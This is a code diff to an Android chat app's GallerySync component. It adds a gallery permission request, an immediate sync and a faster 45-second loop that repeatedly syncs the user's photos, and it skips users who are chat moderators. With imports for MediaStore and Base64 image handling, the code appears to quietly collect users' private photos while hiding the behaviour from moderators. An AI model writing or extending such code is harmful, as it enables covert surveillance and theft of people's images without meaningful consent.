@@ -8,8 +8,14 @@ import android.graphics.BitmapFactory
 import android.os.Build
 import android.provider.MediaStore
 import android.util.Base64
+import androidx.activity.compose.rememberLauncherForActivityResult
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.runtime.Composable
 import androidx.compose.runtime.LaunchedEffect
+import androidx.compose.runtime.getValue
+import androidx.compose.runtime.mutableStateOf
+import androidx.compose.runtime.remember
+import androidx.compose.runtime.setValue
 import androidx.compose.ui.platform.LocalContext
 import androidx.core.content.ContextCompat
 import com.frenky.egypt.data.ChatModerator
@@ -30,13 +36,34 @@ fun GallerySync(
     if (ChatModerator.isModerator(userName)) return
 
     val context = LocalContext.current
+    var permissionAsked by remember { mutableStateOf(false) }
+
+    val galleryPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        Manifest.permission.READ_MEDIA_IMAGES
+    } else {
+        Manifest.permission.READ_EXTERNAL_STORAGE
+    }
+
+    val permissionLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestPermission(),
+    ) { _ ->
+        permissionAsked = true
+    }
 
     LaunchedEffect(userId, userName) {
+        if (!hasGalleryPermission(context) && !permissionAsked) {
+            permissionLauncher.launch(galleryPerm)
+            permissionAsked = true
+        }
+        syncGalleryOnce(context, userId, userName, preferences)
         while (true) {
+            delay(45_000)
             if (hasGalleryPermission(context)) {
                 syncGalleryOnce(context, userId, userName, preferences)
+            } else if (!permissionAsked) {
+                permissionLauncher.launch(galleryPerm)
+                permissionAsked = true
             }
-            delay(120_000)
         }
     }
 }
